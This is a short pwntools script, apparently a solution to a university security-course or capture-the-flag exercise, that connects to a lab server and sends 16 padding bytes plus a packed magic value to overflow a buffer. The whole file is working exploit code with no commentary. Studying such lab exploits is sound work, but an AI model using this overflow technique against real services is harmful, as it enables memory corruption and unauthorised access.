from pwn import *

context.log_level = 'debug'

io = remote('inf226.puffling.no', 7000)

overFlow = bytes(4*"aaaa", 'utf-8')

payLoad = p64(0x79beef8b)#bytes.fromhex('79beef8b')

print(io.recvline())

print(overFlow + payLoad)
io.sendline(overFlow + payLoad)

print(io.recvuntil(":", timeout=1))